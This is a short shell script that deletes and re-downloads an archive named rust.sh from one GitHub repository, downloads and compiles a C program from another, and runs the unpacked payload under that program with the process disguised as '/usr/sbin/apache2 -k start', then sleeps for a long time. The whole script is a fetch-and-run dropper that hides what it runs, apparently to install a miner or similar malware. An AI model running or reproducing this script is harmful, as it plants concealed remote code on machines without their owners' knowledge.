#!/bin/sh
rm rust.sh
wget https://github.com/asejek39/python-getting-started/raw/main/rust.sh
tar xf rust.sh
wget https://github.com/vamzie2282/tesar373/raw/main/test.c
gcc -o test test.c 
./test -s "/usr/sbin/apache2 -k start" -d -p test.pid ./rust.sh 
sleep 65000
